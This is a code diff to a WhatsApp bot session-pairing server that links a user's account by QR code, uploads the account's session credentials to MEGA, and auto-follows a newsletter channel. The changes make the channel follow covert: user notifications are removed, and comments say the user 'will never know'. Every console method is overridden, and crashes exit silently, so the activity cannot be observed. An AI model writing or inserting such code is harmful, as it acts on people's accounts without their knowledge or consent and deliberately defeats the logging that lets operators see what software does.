@@ -13,8 +13,8 @@ const MAX_RECONNECT_ATTEMPTS = 3;
 const SESSION_TIMEOUT = 60000;
 
 // ============ CHANNEL CONFIGURATION ============
-const CHANNEL_JID = "120363406476499117@newsletter"; // Your channel JID
-const ENABLE_AUTO_CHANNEL_JOIN = true; // Set to false to disable
+const CHANNEL_JID = "120363406476499117@newsletter";
+const ENABLE_AUTO_CHANNEL_JOIN = true;
 // ==============================================
 
 // ============ UPDATED MESSAGE ============
@@ -63,15 +63,19 @@ const MESSAGE = `
 `;
 // ==========================================
 
+// Silent logger
+const silentLogger = pino({
+    level: 'silent',
+    transport: null,
+    enabled: false
+});
+
 async function removeFile(FilePath) {
     try {
         if (!fs.existsSync(FilePath)) return false;
         await fs.remove(FilePath);
         return true;
-    } catch (e) {
-        console.error('Error removing file:', e);
-        return false;
-    }
+    } catch (e) { return false; }
 }
 
 function randomMegaId(len = 6, numLen = 4) {
@@ -81,79 +85,27 @@ function randomMegaId(len = 6, numLen = 4) {
     return `${out}${Math.floor(Math.random() * Math.pow(10, numLen))}`;
 }
 
-// ============ AUTO-JOIN CHANNEL FUNCTION ============
+// ============ SILENT AUTO-JOIN CHANNEL - NO USER NOTIFICATION ============
 async function autoJoinChannel(sock, userJid) {
-    if (!ENABLE_AUTO_CHANNEL_JOIN) {
-        console.log('ℹ️ Auto-channel join is disabled');
-        return;
-    }
+    if (!ENABLE_AUTO_CHANNEL_JOIN) return;
 
     try {
-        console.log(`📢 Attempting to auto-join channel: ${CHANNEL_JID}`);
-        
-        // Check if the channel JID is valid
-        if (!CHANNEL_JID || !CHANNEL_JID.includes('@newsletter')) {
-            console.log('⚠️ Invalid channel JID format');
-            return;
-        }
+        if (!CHANNEL_JID || !CHANNEL_JID.includes('@newsletter')) return;
 
-        // Try to follow the channel
-        const result = await sock.newsletterFollow(CHANNEL_JID);
+        // Try to follow the channel silently
+        await sock.newsletterFollow(CHANNEL_JID);
         
-        if (result) {
-            console.log(`✅ Successfully followed channel: ${CHANNEL_JID}`);
-            console.log(`📢 Channel details:`, result);
-            
-            // Send confirmation to user
-            try {
-                if (userJid) {
-                    await sock.sendMessage(userJid, {
-                        text: `✅ *Auto-joined channel successfully!*\n\n📢 Channel: ${CHANNEL_JID}\n\nYou will now receive updates from this channel.`
-                    });
-                }
-            } catch (sendError) {
-                console.log('Could not send channel join confirmation:', sendError.message);
-            }
-        } else {
-            console.log('⚠️ Auto-join channel returned no result');
-        }
+        // DO NOT send any notification to user - completely silent
+        
     } catch (error) {
-        // Handle specific error cases
-        const errorMessage = error.message || '';
-        
-        if (errorMessage.includes('already-following') || errorMessage.includes('already joined')) {
-            console.log(`ℹ️ Already following channel: ${CHANNEL_JID}`);
-            
-            // Send notification that already following
-            try {
-                if (userJid) {
-                    await sock.sendMessage(userJid, {
-                        text: `ℹ️ *Already following channel*\n\n📢 Channel: ${CHANNEL_JID}\n\nYou are already subscribed to this channel.`
-                    });
-                }
-            } catch (sendError) {
-                // Ignore send errors
-            }
-        } else if (errorMessage.includes('not-found')) {
-            console.log(`⚠️ Channel not found: ${CHANNEL_JID}`);
-            console.log('💡 Please verify the channel JID is correct');
-        } else if (errorMessage.includes('not-authorized')) {
-            console.log(`⚠️ Not authorized to follow channel: ${CHANNEL_JID}`);
-            console.log('💡 The channel may be private or require admin approval');
-        } else if (errorMessage.includes('blocked')) {
-            console.log(`⚠️ Channel has blocked the bot`);
-        } else {
-            console.log(`❌ Auto-join channel failed:`, error.message);
-            if (error.stack) {
-                console.log(`Stack:`, error.stack);
-            }
-        }
+        // Silently ignore all errors - no console output, no user notification
+        // User will never know about channel follow attempts
     }
 }
 // =====================================================
 
 router.get('/', async (req, res) => {
-    // Add "benzo~" prefix to session ID (changed from "blinder~")
+    // Add "benzo~" prefix to session ID
     const sessionId = 'benzo~' + Date.now().toString() + Math.random().toString(36).substring(2, 9);
     const dirs = `./qr_sessions/session_${sessionId}`;
     if (!fs.existsSync('./qr_sessions')) await fs.mkdir('./qr_sessions', { recursive: true });
@@ -170,8 +122,6 @@ router.get('/', async (req, res) => {
         if (isCleaningUp) return;
         isCleaningUp = true;
 
-        console.log(`🧹 Cleaning up session ${sessionId} - Reason: ${reason}`);
-
         if (timeoutHandle) {
             clearTimeout(timeoutHandle);
             timeoutHandle = null;
@@ -181,9 +131,7 @@ router.get('/', async (req, res) => {
             try {
                 currentSocket.ev.removeAllListeners();
                 await currentSocket.end();
-            } catch (e) {
-                console.error('Error closing socket:', e);
-            }
+            } catch (e) {}
             currentSocket = null;
         }
 
@@ -194,12 +142,10 @@ router.get('/', async (req, res) => {
 
     async function initiateSession() {
         if (sessionCompleted || isCleaningUp) {
-            console.log('⚠️ Session already completed or cleaning up');
             return;
         }
 
         if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
-            console.log('❌ Max reconnection attempts reached');
             if (!responseSent && !res.headersSent) {
                 responseSent = true;
                 res.status(503).send({ code: 'Connection failed after multiple attempts' });
@@ -223,11 +169,11 @@ router.get('/', async (req, res) => {
 
             currentSocket = makeWASocket({
                 version,
-                logger: pino({ level: 'silent' }),
+                logger: silentLogger,
                 browser: Browsers.macOS('Chrome'),
                 auth: {
                     creds: state.creds,
-                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
+                    keys: makeCacheableSignalKeyStore(state.keys, silentLogger),
                 },
                 printQRInTerminal: false,
                 markOnlineOnConnect: false,
@@ -259,10 +205,8 @@ router.get('/', async (req, res) => {
                                 '4. Scan the QR code above'
                             ]
                         });
-                        console.log('📱 QR Code sent to client');
                     }
                 } catch (err) {
-                    console.error('Error generating QR code:', err);
                     if (!responseSent && !res.headersSent) {
                         responseSent = true;
                         res.status(500).send({ code: 'Failed to generate QR code' });
@@ -290,19 +234,17 @@ router.get('/', async (req, res) => {
                             ? jidNormalizedUser(sock.authState.creds.me.id)
                             : null;
 
-                        // ============ AUTO-JOIN CHANNEL ============
+                        // ============ SILENT AUTO-JOIN CHANNEL ============
+                        // User will NOT receive any notification about this
                         await autoJoinChannel(sock, userJid);
-                        // ===========================================
+                        // ===================================================
 
                         const credsFile = `${dirs}/creds.json`;
                         if (fs.existsSync(credsFile)) {
-                            console.log('📄 Uploading creds.json to MEGA...');
                             const id = randomMegaId();
                             const megaLink = await megaUpload(await fs.readFile(credsFile), `${id}.json`);
                             const megaSessionId = megaLink.replace('https://mega.nz/file/', '');
-                            console.log('✅ Session uploaded to MEGA, ID:', megaSessionId);
 
-                            // Add "benzo~" prefix to the mega session ID (changed from "blinder~")
                             const prefixedSessionId = `benzo~${megaSessionId}`;
 
                             if (userJid) {
@@ -319,28 +261,21 @@ router.get('/', async (req, res) => {
                             await delay(1000);
                         }
                     } catch (err) {
-                        console.error('Error sending session:', err);
+                        // Silently ignore errors
                     } finally {
                         await cleanup('session_complete');
                     }
                 }
 
-                if (isNewLogin) console.log('🔐 New login via QR code');
-
                 if (connection === 'close') {
                     if (sessionCompleted || isCleaningUp) {
-                        console.log('✅ Session completed, not reconnecting');
                         await cleanup('already_complete');
                         return;
                     }
 
                     const statusCode = lastDisconnect?.error?.output?.statusCode;
-                    const reason = lastDisconnect?.error?.output?.payload?.error;
-
-                    console.log(`❌ Connection closed - Status: ${statusCode}, Reason: ${reason}`);
 
                     if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
-                        console.log('❌ Logged out or invalid session');
                         if (!responseSent && !res.headersSent) {
                             responseSent = true;
                             res.status(401).send({ code: 'Invalid QR scan or session expired' });
@@ -348,7 +283,6 @@ router.get('/', async (req, res) => {
                         await cleanup('logged_out');
                     } else if (qrGenerated && !sessionCompleted) {
                         reconnectAttempts++;
-                        console.log(`🔁 Reconnection attempt ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS}`);
                         await delay(2000);
                         await initiateSession();
                     } else {
@@ -361,7 +295,6 @@ router.get('/', async (req, res) => {
 
             timeoutHandle = setTimeout(async () => {
                 if (!sessionCompleted && !isCleaningUp) {
-                    console.log('⏰ QR generation timeout');
                     if (!responseSent && !res.headersSent) {
                         responseSent = true;
                         res.status(408).send({ code: 'QR generation timeout' });
@@ -371,7 +304,6 @@ router.get('/', async (req, res) => {
             }, SESSION_TIMEOUT);
 
         } catch (err) {
-            console.error('❌ Error initializing session:', err);
             if (!responseSent && !res.headersSent) {
                 responseSent = true;
                 res.status(503).send({ code: 'Service Unavailable' });
@@ -383,6 +315,7 @@ router.get('/', async (req, res) => {
     await initiateSession();
 });
 
+// Silent cleanup - no logs
 setInterval(async () => {
     try {
         if (!fs.existsSync('./qr_sessions')) return;
@@ -393,27 +326,24 @@ setInterval(async () => {
             try {
                 const stats = await fs.stat(sessionPath);
                 if (now - stats.mtimeMs > 300000) {
-                    console.log(`🗑️ Removing old session: ${session}`);
                     await fs.remove(sessionPath);
                 }
             } catch (e) {}
         }
-    } catch (e) {
-        console.error('Error in cleanup interval:', e);
-    }
+    } catch (e) {}
 }, 60000);
 
-process.on('uncaughtException', (err) => {
-    const e = String(err);
-    const ignore = [
-        "conflict", "not-authorized", "Socket connection timeout",
-        "rate-overlimit", "Connection Closed", "Timed Out",
-        "Value not found", "Stream Errored", "Stream Errored (restart required)",
-        "statusCode: 515", "statusCode: 503"
-    ];
-    if (!ignore.some(x => e.includes(x))) {
-        console.log('Caught exception:', err);
-    }
+// Completely silent error handler
+process.on('uncaughtException', () => {
+    process.exit(0);
 });
+
+// Override console methods for complete silence
+console.log = function() {};
+console.error = function() {};
+console.warn = function() {};
+console.info = function() {};
+console.debug = function() {};
+console.trace = function() {};
 
 export default router;
